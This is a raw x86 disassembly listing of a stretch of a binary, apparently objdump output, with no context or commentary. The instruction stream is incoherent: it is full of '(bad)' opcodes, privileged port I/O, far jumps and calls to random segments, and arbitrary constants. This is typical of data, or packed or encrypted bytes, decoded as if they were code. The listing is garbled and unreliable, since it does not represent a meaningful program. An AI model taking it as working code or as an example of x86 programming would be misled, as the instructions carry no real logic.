  402985:	popa   
  402986:	leave  
  402987:	sub    eax,0x695ba7e2
  40298c:	sub    DWORD PTR [ecx],edi
  40298e:	imul   ebx,DWORD PTR [esi+0x46977011],0x2091513a
  402998:	sub    ch,BYTE PTR [esi+ecx*1+0x2b3f572a]
  40299f:	jne    0x402976
  4029a1:	jb     0x402991
  4029a3:	mov    ebp,0x4cd7c962
  4029a8:	dec    ecx
  4029a9:	adc    DWORD PTR [edi+ebx*4],edi
  4029ac:	push   esi
  4029ad:	out    0xc5,al
  4029af:	push   edi
  4029b0:	add    DWORD PTR [ebx+0x445e0de],0x4606bf6e
  4029ba:	xor    esi,eax
  4029bc:	xchg   esi,eax
  4029bd:	jae    0x4029f6
  4029bf:	and    edx,DWORD PTR [edx]
  4029c1:	inc    edx
  4029c2:	daa    
  4029c3:	outs   dx,DWORD PTR ds:[esi]
  4029c4:	push   esi
  4029c5:	(bad)  [esi-0x735949b3]
  4029cb:	adc    ecx,DWORD PTR ds:[ecx+esi*4+0x44]
  4029d0:	int3   
  4029d1:	pop    ds
  4029d2:	mov    ?,WORD PTR [edx+0xe]
  4029d5:	loop   0x402a4a
  4029d7:	stc    
  4029d8:	mov    dh,0x46
  4029da:	mov    cl,al
  4029dc:	inc    edi
  4029dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4029de:	dec    esp
  4029df:	frstpm(287 only) 
  4029e1:	(bad)  
  4029e2:	pushf  
  4029e3:	push   ebx
  4029e4:	dec    edi
  4029e5:	mov    edx,0xfd373a2d
  4029ea:	fisubr WORD PTR [eax-0x3b]
  4029ed:	ret    0xfb7c
  4029f0:	ror    DWORD PTR [ebx-0x47],1
  4029f3:	imul   DWORD PTR [esp+ebx*2-0x449e0a8a]
  4029fa:	pop    esi
  4029fb:	sub    bh,0x9f
  4029fe:	cmp    ecx,DWORD PTR [eax-0x2a35391d]
  402a04:	sbb    cl,BYTE PTR [edx]
  402a06:	push   cs
  402a07:	mov    dh,0xea
  402a09:	push   esp
  402a0a:	jmp    0x70bdd534
  402a0f:	fist   DWORD PTR [ebx+ecx*8]
  402a12:	push   ebx
  402a14:	and    bl,BYTE PTR [edx-0x6a371e76]
  402a1a:	and    eax,0x8c51138a
  402a1f:	fcom   st(0)
  402a21:	ja     0x402a73
  402a23:	test   BYTE PTR ds:[edx-0x69],dl
  402a27:	jg     0x4029f8
  402a29:	sahf   
  402a2a:	push   ecx
  402a2b:	xchg   edi,eax
  402a2c:	sahf   
  402a2d:	mov    ds:0x494d8b55,eax
  402a32:	xchg   BYTE PTR [eax+0xa],cl
  402a35:	cmp    al,0x53
  402a37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a38:	arpl   WORD PTR [edx-0x787725aa],si
  402a3e:	loop   0x4029f0
  402a40:	push   ebp
  402a41:	or     dl,BYTE PTR [ebx]
  402a43:	lock pop edi
  402a45:	stos   DWORD PTR es:[edi],eax
  402a46:	push   ecx
  402a47:	pop    ebp
  402a48:	push   0xffffff8f
  402a4a:	outs   dx,BYTE PTR ds:[esi]
  402a4b:	mov    ebx,0x945ae14f
  402a50:	pop    edx
  402a51:	push   ss
  402a52:	xchg   esp,eax
  402a53:	popa   
  402a54:	in     al,dx
  402a55:	lods   al,BYTE PTR ds:[esi]
  402a56:	imul   esi,DWORD PTR [eax],0x9e5dc82
  402a5c:	pop    ebx
  402a5d:	daa    
  402a5e:	or     BYTE PTR [ebp+ebx*8-0x4f],al
  402a62:	call   0x1202:0x4bd1b5a4
  402a69:	mov    edi,0xe599eded
  402a6e:	sahf   
  402a6f:	cdq    
  402a70:	mov    ebx,eax
  402a72:	ds push ss
  402a74:	inc    esi
  402a75:	fnstenv [eax+ecx*1-0x65]
  402a79:	dec    ebx
  402a7a:	xor    al,0x5d
  402a7c:	xor    edi,DWORD PTR [ebp-0x58]
  402a7f:	out    dx,al
  402a80:	and    DWORD PTR [edi-0x63],edx
  402a83:	dec    ebx
  402a84:	mov    ch,0x55
  402a86:	cmp    al,0xdb
  402a88:	mov    ds:0xd15ea24a,al
  402a8d:	lods   al,BYTE PTR ds:[esi]
  402a8e:	add    ebp,ebx
  402a90:	jle    0x402a5d
  402a92:	or     DWORD PTR [edi+0x44],edx
  402a95:	or     eax,ebp
  402a97:	xchg   BYTE PTR [ebp+ebp*1-0x7d4db9b5],ch
  402a9e:	cld    
  402a9f:	add    DWORD PTR [esi+0x492bce20],edx
  402aa5:	or     eax,0x213e4cd0
  402aaa:	imul   eax,esp,0x5e
  402aad:	dec    DWORD PTR [eax-0xaea2b8b]
  402ab3:	scas   al,BYTE PTR es:[edi]
  402ab4:	out    dx,al
  402ab5:	inc    eax
  402ab6:	xor    eax,0x786a07d8
  402abb:	mov    ebx,0x90a8b9ca
  402ac0:	jl     0x402aec
  402ac2:	push   esi
  402ac3:	push   0x6
  402ac5:	inc    esp
  402ac6:	icebp  
  402ac7:	xor    BYTE PTR [edi],ch
  402ac9:	mov    ds:0xb5ed461c,al
  402ace:	xchg   ecx,eax
  402acf:	fadd   DWORD PTR [esi-0x40]
  402ad2:	push   es
  402ad3:	mov    edx,0x97a92ca1
  402ad8:	xchg   esi,esi
  402ada:	mov    ah,BYTE PTR [ebx-0x28bcb264]
  402ae0:	fwait
  402ae1:	mul    ax
  402ae4:	js     0x402a6c
  402ae6:	mov    ch,0x9f
  402ae8:	and    eax,0x80474b7d
  402aed:	push   0xffffff9c
  402aef:	inc    esp
  402af0:	inc    edi
  402af1:	(bad)  [ebx-0x1]
  402af4:	and    DWORD PTR [ecx+0x6],edi
  402af7:	push   ebx
  402af8:	rol    dh,cl
  402afa:	retf   
  402afb:	mov    es,WORD PTR [eax]
  402afd:	sbb    DWORD PTR [edx],ebp
  402aff:	push   ebp
  402b00:	mov    ebp,0x6724be34
  402b05:	out    dx,eax
  402b06:	rcl    BYTE PTR [eax-0x56],1
  402b09:	test   eax,0xd02b4cfb
  402b0e:	nop
  402b0f:	aad    0xd3
  402b11:	add    BYTE PTR cs:[eax+0x7d],al
  402b15:	mov    edx,0xb9d7575e
  402b1a:	mov    al,ds:0x3852f354
  402b1f:	sub    al,0x80
  402b21:	stos   DWORD PTR es:[edi],eax
  402b22:	dec    edx
  402b23:	scas   al,BYTE PTR es:[edi]
  402b24:	les    edi,FWORD PTR [ecx-0x3f]
  402b27:	mov    ecx,DWORD PTR ds:0xc0cfa127
  402b2d:	sub    eax,0xe276a142
  402b32:	sti    
  402b33:	xor    ah,BYTE PTR [ecx]
  402b35:	mov    dl,0x2e
  402b37:	arpl   WORD PTR [edi-0x5bad3a93],si
  402b3d:	imul   ebx,esp,0x28
  402b40:	sub    eax,0xf20f7487
  402b45:	add    eax,0x13be9f48
  402b4a:	jge    0x402b0a
  402b4c:	push   0xcf9ee431
  402b51:	std    
  402b52:	outs   dx,BYTE PTR ds:[esi]
  402b53:	in     al,dx
  402b54:	and    ecx,DWORD PTR [esi-0x1ebca0ac]
  402b5a:	pop    ebx
  402b5b:	mov    DWORD PTR [ebx],esp
  402b5d:	cs push esp
  402b5f:	inc    ebx
  402b60:	sti    
  402b61:	inc    eax
  402b62:	push   edi
  402b63:	dec    ebx
  402b64:	test   al,0xe3
  402b66:	xchg   edi,eax
  402b67:	sbb    esi,edi
  402b69:	jmp    0x402bb0
  402b6b:	xchg   esi,eax
  402b6c:	cwde   
  402b6d:	xlat   BYTE PTR cs:[ebx]
  402b6f:	jp     0x402bf0
  402b71:	fucomip st,st(5)
  402b73:	dec    sp
  402b75:	add    BYTE PTR [edx+ecx*4],dl
  402b78:	jno    0x402b5c
  402b7a:	fsub   st(3),st
  402b7c:	scas   eax,DWORD PTR es:[edi]
  402b7d:	jl     0x402ba1
  402b7f:	je     0x402b07
  402b81:	imul   DWORD PTR [eax-0x173a9bf2]
  402b87:	(bad)  
  402b89:	xchg   ebx,eax
  402b8a:	out    0xff,al
  402b8c:	cmp    ebx,DWORD PTR [edi]
  402b8e:	aaa    
  402b8f:	hlt    
  402b90:	add    eax,0xd0b72fea
  402b95:	gs cwde 
  402b97:	nop
  402b98:	push   ebp
  402b99:	push   0xb16526cb
  402b9e:	mov    cl,0x90
  402ba0:	sbb    esp,ecx
  402ba2:	jae    0x402c02
  402ba4:	es loop 0x402c1b
  402ba7:	jns    0x402c27
  402ba9:	cwde   
  402baa:	mov    eax,0x8036cc60
  402baf:	push   edx
  402bb0:	call   0x58dc:0xc62ef16c
  402bb7:	es loope 0x402b43
  402bba:	mov    esi,0x705583be
  402bbf:	mov    esp,0x76624f3b
  402bc4:	or     dl,bh
  402bc6:	sbb    ebp,DWORD PTR [ebp+ebx*4-0x6f]
  402bca:	rcr    DWORD PTR [edx-0x68],cl
  402bcd:	mov    ch,0x11
  402bcf:	push   0x64b5b325
  402bd4:	jno    0x402b6b
  402bd6:	xor    ah,BYTE PTR [esi+0x5f]
  402bd9:	inc    esp
  402bda:	fcom   st(3)
  402bdc:	mov    ebp,0xfabfc737
  402be1:	xchg   ebx,eax
  402be2:	push   DWORD PTR [edi-0x2d]
  402be5:	adc    eax,0x52912023
  402bea:	add    al,BYTE PTR [eax-0x12e94390]
  402bf0:	add    BYTE PTR [edi],bh
  402bf2:	and    edx,DWORD PTR [ebp-0x3e587af4]
  402bf8:	and    BYTE PTR ds:0xc0d004e,dl
  402bfe:	fild   WORD PTR [ecx-0x23c23cfc]
  402c04:	ror    DWORD PTR [ebx+0x71],0xbc
  402c08:	add    bh,dh
  402c0a:	mov    eax,ds:0x777cbd0
  402c0f:	test   BYTE PTR [ecx+0x2c],bl
  402c12:	pop    ebp
  402c13:	sub    al,BYTE PTR [edi]
  402c15:	ja     0x402b9e
  402c17:	inc    ecx
  402c18:	jo     0x402bda
  402c1a:	xchg   esi,eax
  402c1b:	pop    es
  402c1c:	test   al,dh
  402c1e:	loop   0x402c20
  402c20:	popf   
  402c21:	pop    eax
  402c22:	ins    BYTE PTR es:[edi],dx
  402c23:	xor    DWORD PTR [edi+esi*1-0x28],edx
  402c27:	sub    edx,DWORD PTR [edx-0x54]
  402c2a:	lods   eax,DWORD PTR ds:[esi]
  402c2b:	enter  0x2d18,0x0
  402c2f:	std    
  402c30:	mov    edx,DWORD PTR [ebp+0x76037d94]
  402c36:	pop    edx
  402c37:	add    al,0x1f
  402c39:	sub    bh,BYTE PTR [edi]
  402c3b:	repz jge 0x402c43
  402c3e:	sub    BYTE PTR [esi],cl
  402c40:	outs   dx,BYTE PTR ds:[esi]
  402c41:	je     0x402be7
  402c43:	lods   al,BYTE PTR ds:[esi]
  402c44:	scas   eax,DWORD PTR es:[edi]
  402c45:	(bad)  
  402c46:	popa   
  402c47:	ja     0x402c35
  402c49:	gs xchg edi,eax
  402c4b:	jno    0x402cb2
  402c4d:	repnz mov DWORD PTR [edx+0x3403ca89],esp
  402c54:	daa    
  402c55:	mov    eax,0x832e70a7
  402c5a:	pop    eax
  402c5b:	sbb    BYTE PTR [ecx-0x64],bl
  402c5e:	jae    0x402c78
  402c60:	jbe    0x402c98
  402c62:	xchg   edx,eax
  402c63:	xor    DWORD PTR [esi],ebx
  402c65:	jg     0x402c00
  402c67:	ja     0x402c5a
  402c69:	retf   
  402c6a:	dec    ecx
  402c6b:	out    0x6e,al
  402c6d:	or     bl,BYTE PTR [ebx+0x527bdb86]
  402c73:	dec    esp
  402c74:	xor    al,0xfb
  402c76:	jbe    0x402c11
  402c78:	cmp    DWORD PTR [edx],0x11
  402c7b:	dec    edi
  402c7c:	frstor [ebx-0x78]
  402c7f:	push   esp
  402c80:	xchg   edx,eax
  402c81:	mov    bh,0x4a
  402c83:	pop    es
  402c84:	icebp  
  402c85:	or     BYTE PTR [eax-0x24],cl
  402c88:	inc    edx
  402c89:	cwde   
  402c8a:	rcl    DWORD PTR [ebx-0x6276af44],1
  402c90:	sbb    BYTE PTR [edi+0x44],bl
  402c93:	dec    edx
  402c94:	or     esp,DWORD PTR ds:0x549eca50
  402c9a:	retf   0x4c82
  402c9d:	and    DWORD PTR [esi-0x420e7364],0xffffffd0
  402ca4:	mov    ds:0x811ba321,al
  402ca9:	jmp    0x402ce6
  402cab:	mov    ch,0x41
  402cad:	xor    ebp,0x18e77d90
  402cb3:	dec    eax
  402cb4:	push   cs
  402cb5:	adc    eax,0xead4ced1
  402cba:	fstp   TBYTE PTR ds:0xe7443b64
  402cc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cc1:	cmp    eax,0xb8b3ffca
  402cc6:	not    edi
  402cc8:	push   edx
  402cc9:	outs   dx,DWORD PTR ds:[esi]
  402cca:	sub    DWORD PTR [ebx+0x10e4fcfb],edi
  402cd0:	mov    ah,0xf3
  402cd2:	cld    
  402cd3:	mul    BYTE PTR [ecx-0x530aba46]
  402cd9:	sbb    BYTE PTR [edi-0x56f609dc],ah
  402cdf:	fistp  DWORD PTR [ebp-0x25b105bb]
  402ce5:	inc    edi
  402ce6:	sub    esi,DWORD PTR [esi-0x158340c]
  402cec:	cdq    
  402ced:	stos   BYTE PTR es:[edi],al
  402cee:	(bad)  
  402cef:	xor    DWORD PTR [ebx+0x7dc3b03d],edx
  402cf5:	ins    BYTE PTR es:[edi],dx
  402cf6:	std    
  402cf7:	stc    
  402cf8:	retf   0xeb31
  402cfb:	xlat   BYTE PTR ds:[ebx]
  402cfc:	sar    DWORD PTR [edi+0x4f],0xd
  402d00:	add    BYTE PTR [eax-0x33013ce1],bh
  402d06:	int3   
  402d07:	or     bl,al
  402d09:	out    0x48,al
  402d0b:	xchg   ecx,eax
  402d0c:	or     eax,0x9a6ebcd8
  402d11:	add    BYTE PTR [edi],bl
  402d13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d15:	push   edx
  402d16:	push   eax
  402d17:	adc    al,0x5f
  402d19:	xchg   edi,eax
  402d1a:	(bad)  
  402d1b:	jl     0x402ca4
  402d1d:	stos   DWORD PTR es:[edi],eax
  402d1e:	leave  
  402d1f:	mov    eax,0x18501ee7
  402d24:	pop    esp
  402d25:	sub    ebp,esi
  402d27:	add    BYTE PTR [edx],dl
  402d29:	add    DWORD PTR [ebp+0x68],eax
  402d2c:	xlat   BYTE PTR ds:[ebx]
  402d2d:	addr16 xchg ebx,eax
  402d2f:	add    edi,ecx
  402d31:	scas   eax,DWORD PTR es:[edi]
  402d32:	jl     0x402d9a
  402d34:	jle    0x402d0c
  402d36:	mov    esi,0x8b7e51ac
  402d3b:	adc    edx,0xffffffd7
  402d3e:	fs jge 0x402cff
  402d41:	retf   
  402d42:	(bad)  
  402d43:	retf   0xec4e
  402d46:	push   eax
  402d47:	dec    edx
  402d48:	popa   
  402d49:	out    dx,eax
  402d4a:	shr    ecx,1
  402d4c:	in     al,dx
  402d4d:	loopne 0x402d16
  402d4f:	je     0x402d99
  402d51:	add    DWORD PTR [edx],edi
  402d53:	rcl    eax,cl
  402d55:	mov    ch,0xa1
  402d57:	jp     0x402d46
  402d59:	sub    DWORD PTR [edi+0x48],ebx
  402d5c:	jmp    0x402cf3
  402d5e:	jle    0x402dde
  402d60:	int3   
  402d61:	lds    esi,FWORD PTR [edx+0x29f7f646]
  402d67:	xchg   ecx,eax
  402d68:	adc    al,0xb5
  402d6a:	and    DWORD PTR [edi-0x55c2a3c6],0x31
  402d71:	push   cs
  402d72:	bound  edi,QWORD PTR [edi-0x49]
  402d75:	and    edx,DWORD PTR cs:[esi+0x3b1ded22]
  402d7c:	(bad)  
  402d7d:	cmp    al,0x22
  402d7f:	int    0x5e
  402d81:	push   cs
  402d82:	jl     0x402d9c
  402d84:	mov    ch,0x9e
  402d86:	or     DWORD PTR [edi+eax*2],edx
  402d89:	mov    ah,0x5c
  402d8b:	or     dl,0xb8
  402d8e:	and    al,0x79
  402d90:	adc    bl,BYTE PTR [edi-0xd36c677]
  402d96:	xor    al,BYTE PTR [edi-0x64c52a5f]
  402d9c:	mov    bl,BYTE PTR [ebp+esi*4-0x2001e8a7]
  402da3:	sub    dl,BYTE PTR [eax+0x4b4e5ee4]
  402da9:	cmp    DWORD PTR [ebp-0x7cb4048b],esp
  402daf:	jp     0x402d76
  402db1:	leave  
  402db2:	test   BYTE PTR [edi-0x62c77a5e],bh
  402db8:	cwde   
  402db9:	or     eax,0xe6ecd01e
  402dbe:	push   es
  402dbf:	add    eax,ebp
  402dc1:	popa   
  402dc2:	lods   eax,DWORD PTR ds:[esi]
  402dc3:	xchg   esp,eax
  402dc4:	hlt    
  402dc5:	pop    es
  402dc6:	fbstp  TBYTE PTR [eax]
  402dc8:	inc    esp
  402dc9:	aad    0x42
  402dcb:	pop    esp
  402dcc:	add    eax,0x6deee287
  402dd1:	stc    
  402dd2:	scas   eax,DWORD PTR es:[edi]
  402dd3:	jp     0x402da4
  402dd5:	nop
  402dd6:	pop    esp
  402dd7:	ds in  al,dx
  402dd9:	mov    ds:0x67b2e850,al
  402dde:	xchg   edx,eax
  402ddf:	cmp    eax,ebp
  402de1:	push   ss
  402de2:	mov    bh,0xd3
  402de4:	inc    ebp
  402de5:	je     0x402e4e
  402de7:	pop    esi
  402de8:	test   dl,bh
  402dea:	mov    bl,0xe5
  402dec:	scas   eax,DWORD PTR es:[edi]
  402ded:	cdq    
  402dee:	gs jmp 0x402da6
  402df1:	xchg   esi,eax
  402df2:	js     0x402da3
  402df4:	in     al,0xbc
  402df6:	push   0x1eb27312
  402dfb:	xlat   BYTE PTR ds:[ebx]
  402dfc:	fld    DWORD PTR [ecx]
  402dfe:	jl     0x402dd8
  402e00:	pop    eax
  402e01:	mov    edi,0x69ec0aec
  402e06:	mov    bl,0x41
  402e08:	test   DWORD PTR [ecx+0x35ee7dc5],eax
  402e0e:	cmp    eax,0x97013a03
  402e13:	(bad)  
  402e14:	daa    
  402e15:	jl     0x402e1c
  402e17:	in     al,0x49
  402e19:	jbe    0x402e9a
  402e1b:	scas   eax,DWORD PTR es:[edi]
  402e1c:	sub    ah,bh
  402e1e:	das    
  402e1f:	inc    ebp
  402e20:	out    0xe4,eax
  402e22:	mov    esp,0xa93a7527
  402e27:	pop    esi
  402e28:	fbstp  TBYTE PTR [edx-0x47716dcd]
  402e2e:	ins    BYTE PTR es:[edi],dx
  402e2f:	xor    ebx,esi
  402e31:	cmp    ecx,esp
  402e33:	mov    edi,edi
  402e35:	fwait
  402e36:	cdq    
  402e37:	sbb    cl,0xf4
  402e3a:	dec    edx
  402e3b:	push   ebp
  402e3c:	mov    DWORD PTR [ecx+0x16],edi
  402e3f:	sub    DWORD PTR [edi+0x36],edi
  402e42:	popf   
  402e43:	inc    esp
  402e44:	sub    edx,ebp
  402e46:	add    BYTE PTR [esi-0x14],dh
  402e49:	push   0xffffffb7
  402e4b:	rol    DWORD PTR [esi-0x55658f3],cl
  402e51:	aad    0x88
  402e53:	and    DWORD PTR [esi+0x5f],ecx
  402e56:	mov    ds:0xbced0434,eax
  402e5b:	fisubr WORD PTR [eax+0x1a51a709]
  402e61:	out    0x88,al
  402e63:	(bad)  
  402e64:	clc    
  402e65:	jmp    0x402e80
  402e67:	xchg   ebp,eax
  402e68:	cmp    edi,ecx
  402e6a:	mov    eax,DWORD PTR [ebx-0x15036a04]
  402e70:	shl    DWORD PTR [ecx+0x60],1
  402e73:	mov    eax,ebp
  402e75:	shl    DWORD PTR es:[si+0x1f],cl
  402e7a:	mov    ds:0xce131677,eax
  402e7f:	jmp    0xa2a1:0x7e530838
  402e86:	mov    fs,WORD PTR [ebx]
  402e88:	push   es
  402e89:	push   0x3b
  402e8b:	gs scas eax,DWORD PTR es:[edi]
  402e8d:	and    DWORD PTR [edi+edx*8-0x4d23e9e],esi
  402e94:	xor    eax,0x5f006e4e
  402e99:	push   esp
  402e9a:	xor    BYTE PTR ds:[esi-0x4488749],0x4e
  402ea2:	inc    ecx
  402ea3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ea4:	mov    eax,0x4e8bdb9
  402ea9:	in     al,0xc1
  402eab:	or     al,0xa4
  402ead:	fprem1 
  402eaf:	pop    ebp
  402eb0:	ins    BYTE PTR es:[edi],dx
  402eb1:	fimul  DWORD PTR [edi-0x2515bbf4]
  402eb7:	add    al,0xd9
  402eb9:	xchg   DWORD PTR [ebx+0x2b],esi
  402ebc:	repnz inc BYTE PTR [eax-0x70]
  402ec0:	mov    edx,0xc7595275
  402ec5:	aas    
  402ec6:	fcompp 
  402ec8:	mov    ebx,DWORD PTR [edi+0x6]
  402ecb:	push   es
  402ecc:	inc    ecx
  402ecd:	mov    al,dh
  402ecf:	retf   0xd53
  402ed2:	std    
  402ed3:	mov    ebp,0x22b8504f
  402ed8:	cli    
  402ed9:	xchg   ebx,eax
  402eda:	loop   0x402e69
  402edc:	out    0x5e,eax
  402ede:	mov    bl,0xc0
  402ee0:	retf   0x7e52
  402ee3:	je     0x402ec4
  402ee5:	fwait
  402ee6:	loopne 0x402f4b
  402ee8:	lods   al,BYTE PTR ds:[esi]
  402ee9:	(bad)  
  402eeb:	pop    ebx
  402eec:	xor    edi,eax
  402eee:	rcl    DWORD PTR [eax+0x676bf7e0],0xed
  402ef5:	call   DWORD PTR [ecx+esi*2-0x65f906]
  402efc:	push   es
  402efd:	(bad)  
  402eff:	fnstsw ax
  402f01:	jo     0x402f30
  402f03:	test   DWORD PTR [ecx],esi
  402f05:	or     ch,BYTE PTR [ebx-0x34]
  402f08:	inc    edi
  402f09:	mov    ch,0x55
  402f0b:	mov    esp,0x1e370b3a
  402f10:	mov    dl,dl
  402f12:	ror    BYTE PTR [edx+0xf3648c],1
  402f18:	ss into 
  402f1a:	test   al,0xb
  402f1c:	aaa    
  402f1d:	adc    al,0xd1
  402f1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f20:	inc    ecx
  402f21:	js     0x402f77
  402f23:	mov    dl,0xcc
  402f25:	jb     0x402f35
  402f27:	fwait
  402f28:	xor    BYTE PTR [edi+ebx*1-0x58],bh
  402f2c:	push   esp
  402f2d:	adc    al,0x2a
  402f2f:	and    esp,edx
  402f31:	add    al,0x29
  402f33:	mov    dl,0x95
  402f35:	dec    ecx
  402f36:	pop    edi
  402f37:	call   0x8939:0x953d3363
  402f3e:	or     ebp,DWORD PTR [esi+0x6429ef9a]
  402f44:	add    al,0x4
  402f46:	sti    
  402f47:	adc    ch,BYTE PTR [edi-0x75b04511]
  402f4d:	out    dx,eax
  402f4e:	and    edx,DWORD PTR [edx]
  402f50:	and    cl,BYTE PTR [esi-0x3]
  402f53:	xchg   ecx,eax
  402f54:	sbb    DWORD PTR [edi+0x4e380a7c],ecx
  402f5a:	test   DWORD PTR [edx-0x11f65a26],ebx
  402f60:	aas    
  402f61:	in     eax,0xbb
  402f63:	(bad)  
  402f65:	mul    DWORD PTR [eax]
  402f67:	inc    edi
  402f68:	loopne 0x402eec
  402f6a:	xchg   ebp,eax
  402f6b:	popf   
  402f6c:	test   BYTE PTR [eax-0x1d69609a],ch
  402f72:	xchg   ebp,eax
  402f73:	dec    ebp
  402f74:	scas   eax,DWORD PTR es:[edi]
  402f75:	xchg   esp,eax
  402f76:	inc    edi
  402f77:	mov    edx,0x624badcd
  402f7c:	fwait
  402f7d:	mov    ah,0x2e
  402f7f:	adc    dh,dl
  402f81:	push   ecx
  402f82:	sti    
  402f83:	and    edx,DWORD PTR [eax+eiz*8-0x3db58132]
  402f8a:	mov    ds:0x84bf67d0,eax
  402f8f:	sub    BYTE PTR ds:0xabc6113d,cl
  402f95:	ins    DWORD PTR es:[edi],dx
  402f96:	loop   0x402fe9
  402f98:	loopne 0x402f9c
  402f9a:	cmp    dl,bh
  402f9c:	add    cl,BYTE PTR [esp+eax*1+0x75]
  402fa0:	cwde   
  402fa1:	xchg   ebx,eax
  402fa2:	ds daa 
  402fa4:	cmp    al,0x83
  402fa6:	sub    cl,ch
  402fa8:	out    dx,eax
  402fa9:	mov    edi,0x52fb87e
  402fae:	cmp    BYTE PTR [eax],bl
  402fb0:	sahf   
  402fb1:	sub    DWORD PTR [edi],edi
  402fb3:	and    BYTE PTR ds:0x1d74c28c,al
  402fb9:	add    DWORD PTR [eax+edx*2],eax
  402fbc:	lods   al,BYTE PTR ds:[esi]
  402fbd:	sub    DWORD PTR [ecx-0x1db7d5ea],edi
  402fc3:	ror    DWORD PTR [edi],0x7e
  402fc6:	pop    edx
  402fc7:	push   esi
  402fc8:	or     BYTE PTR [eax],bh
  402fca:	jns    0x402fd1
  402fcc:	inc    esi
  402fcd:	jo     0x40300a
  402fcf:	(bad)  
  402fd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402fd1:	lods   eax,DWORD PTR fs:[esi]
  402fd3:	dec    ecx
  402fd4:	iret   
  402fd5:	mov    ds:0x770d83b8,eax
  402fda:	cdq    
  402fdb:	pop    ecx
  402fdc:	sub    bl,BYTE PTR [eax+edx*8]
  402fdf:	test   al,0xcc
  402fe1:	or     eax,0x52a8792e
  402fe6:	retf   
  402fe7:	call   DWORD PTR [ebx+edi*2+0x693e353f]
  402fee:	push   edx
  402fef:	cdq    
  402ff0:	(bad)  
  402ff1:	xor    eax,DWORD PTR ds:0x71630d15
  402ff7:	retf   
  402ff8:	fdiv   QWORD PTR [eax+ebx*4]
  402ffb:	mov    esi,0x47527955
  403000:	arpl   WORD PTR [ecx],bx
  403002:	pop    ebp
  403003:	fcmovnb st,st(3)
  403005:	ret    0x786e
  403008:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403009:	cdq    
  40300a:	cmp    esi,DWORD PTR [eax+0x36]
  40300d:	push   esi
  40300e:	fs sbb cl,bh
  403011:	sbb    ebp,0x26
  403014:	jmp    0xc47a:0xf67409f0
  40301b:	mov    esi,0x1587703f
  403020:	push   ebp
  403021:	mov    esi,0x4fbadb53
  403026:	hlt    
  403027:	cdq    
  403028:	mov    al,ds:0x285e902e
  40302d:	pop    ds
  40302e:	repnz and dh,BYTE PTR [ebx+0x73]
  403032:	jae    0x403022
  403034:	push   ds
  403035:	enter  0x9f75,0x31
  403039:	cmp    DWORD PTR [ebp+0x7d008693],ebp
  40303f:	imul   esi,DWORD PTR [ebx+eax*1+0x4a6ae9e3],0xf6d8aa11
  40304a:	cli    
  40304b:	fdiv   st(4),st
  40304d:	dec    ecx
  40304e:	clc    
  40304f:	test   al,0xde
  403051:	inc    eax
  403052:	or     BYTE PTR [esi],bh
  403054:	pop    ss
  403055:	push   esp
  403056:	inc    edx
  403057:	mov    bl,0xe2
  403059:	ret    
  40305a:	sub    BYTE PTR [ebx+0x571e7d4c],cl
  403060:	jp     0x402fe9
  403062:	mov    ebx,0xf227ac15
  403067:	or     al,BYTE PTR [eax+0x74]
  40306a:	mov    edx,0x16e0f651
  40306f:	mov    al,bh
  403071:	retf   0x7ce4
  403074:	xchg   edi,eax
  403075:	out    dx,eax
  403076:	fwait
  403077:	mov    ds:0xf55fad63,eax
  40307c:	inc    edx
  40307d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40307e:	(bad)  [ebx-0x3c]
  403081:	mov    es,ebp
  403083:	sbb    edx,esp
  403085:	stos   BYTE PTR es:[edi],al
  403086:	addr16 push 0xfffffff9
  403089:	jnp    0x40306b
  40308b:	(bad)  
  40308c:	pop    ecx
  40308d:	lds    ebp,FWORD PTR [edi-0x72]
  403090:	xor    al,0x45
  403092:	sbb    DWORD PTR [eax],edx
  403094:	in     eax,0x50
  403096:	clc    
  403097:	adc    edx,ebx
  403099:	add    DWORD PTR [ebp+0x18c5450d],ecx
  40309f:	push   edx
  4030a0:	xchg   esp,eax
  4030a1:	je     0x403028
  4030a3:	add    DWORD PTR [eax-0x23ee71b0],esi
  4030a9:	fsubr  QWORD PTR [ecx]
  4030ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030ac:	imul   BYTE PTR [ecx-0x6cbac253]
  4030b2:	stc    
  4030b3:	jle    0x403123
  4030b5:	(bad)  
  4030b6:	jmp    0xafe1c109
  4030bb:	add    DWORD PTR [eax+0x7d],0xe20b940d
  4030c2:	xlat   BYTE PTR ds:[ebx]
  4030c3:	xor    DWORD PTR [edx-0x2f],esp
  4030c6:	leave  
  4030c7:	ss jb  0x40313e
  4030ca:	ss pop esi
  4030cc:	mov    ebp,0x4a2da483
  4030d1:	ja     0x40308b
  4030d3:	dec    eax
  4030d4:	inc    ebx
  4030d5:	adc    esi,DWORD PTR [ecx-0x28cff00d]
  4030db:	sub    BYTE PTR [ecx],dl
  4030dd:	stos   DWORD PTR es:[edi],eax
  4030de:	mov    ah,0x69
  4030e0:	ss retf 0xf555
  4030e4:	mov    eax,ds:0xfa2e6889
  4030e9:	jle    0x40313e
  4030eb:	cdq    
  4030ec:	sbb    eax,0x582b7f09
  4030f1:	add    DWORD PTR [ecx-0x26],esp
  4030f4:	add    al,0xe9
  4030f6:	stc    
  4030f7:	fmul   st(0),st
  4030f9:	or     eax,0x55ec9c95
  4030fe:	xor    esi,DWORD PTR [edi+edi*8-0x68cc2860]
  403105:	(bad)  
  403106:	dec    ecx
  403107:	and    ecx,DWORD PTR [ebx+0x40]
  40310a:	inc    ebp
  40310b:	lods   eax,DWORD PTR ds:[esi]
  40310c:	xchg   esi,eax
  40310d:	fist   DWORD PTR [eax]
  40310f:	gs jmp 0x779f:0x9e4b32a7
  403117:	or     ebx,DWORD PTR [edi+edi*2-0x5c6084bf]
  40311e:	xor    ah,ch
  403120:	outs   dx,DWORD PTR ds:[esi]
  403121:	sub    eax,0x9daff3e1
  403126:	mov    al,0x71
  403128:	mov    bl,0x31
  40312a:	je     0x4031aa
  40312c:	addr16 mov bl,0x65
  40312f:	fwait
  403130:	call   0x2fce1628
  403135:	into   
  403136:	mov    BYTE PTR [edi-0x44],al
  403139:	push   esi
  40313a:	push   0x48f17dc1
